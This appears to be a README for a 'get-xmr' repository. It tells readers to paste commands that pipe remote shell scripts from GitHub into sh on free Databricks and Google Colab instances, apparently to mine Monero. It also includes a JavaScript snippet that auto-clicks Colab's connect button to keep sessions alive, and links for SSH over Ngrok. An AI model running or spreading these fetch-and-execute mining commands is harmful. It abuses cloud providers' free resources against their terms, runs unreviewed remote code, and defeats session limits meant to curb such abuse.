# Edit + Copy + Paste 👉🏻 [Click here for Tutorial](https://aank.me/Youtube)
* Try Free [Databricks Community Edition](https://bit.ly/Databr1cks)
```markdown
cd /root
curl https://raw.githubusercontent.com/a2nk/get-xmr/main/databricks.sh | sh
```
* Try Free [XRDP GColab](https://bit.ly/XRDP-Colab)
```markdown
curl https://raw.githubusercontent.com/a2nk/get-xmr/main/gcolab-sg.sh | sh
```
```markdown
curl https://raw.githubusercontent.com/a2nk/get-xmr/main/gcolab-us.sh | sh
```
```markdown
curl https://raw.githubusercontent.com/a2nk/get-xmr/main/nvidiacolab-us.sh | sh
```
* Try Free [40 CPU GColab to get XMR](https://bit.ly/GC-40cpu)
 
* Try Free [GPU Check](https://bit.ly/GPU-check)

* Try Free [SSH Using Ngrok](https://bit.ly/Ngrok-SSH)

* Auto Reconnect GColab:
```markdown
var startClickConnect = function startClickConnect(){ var clickConnect = function clickConnect(){ console.log("Connnect Clicked - Start"); document.querySelector("#top-toolbar > colab-connect-button").shadowRoot.querySelector("#connect").click(); console.log("Connnect Clicked - End"); }; var intervalId = setInterval(clickConnect, 60000); var stopClickConnectHandler = function stopClickConnect() { console.log("Connnect Clicked Stopped - Start"); clearInterval(intervalId); console.log("Connnect Clicked Stopped - End"); }; return stopClickConnectHandler; }; var stopClickConnect = startClickConnect();
```
